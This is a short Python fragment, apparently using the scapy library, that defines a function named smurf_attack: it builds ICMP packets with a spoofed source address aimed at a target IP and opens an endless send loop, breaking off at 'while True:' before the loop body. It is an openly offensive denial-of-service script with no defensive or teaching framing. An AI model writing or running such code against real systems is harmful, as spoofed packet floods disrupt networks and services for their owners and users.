from scapy.all import *

def smurf_attack(target_ip, fake_ip):
    # Construct the ICMP packet with a spoofed source IP
    icmp_packet = IP(dst=target_ip, src=fake_ip) / ICMP()
    
    # Send the packet in a loop to perform the attack
    while True:
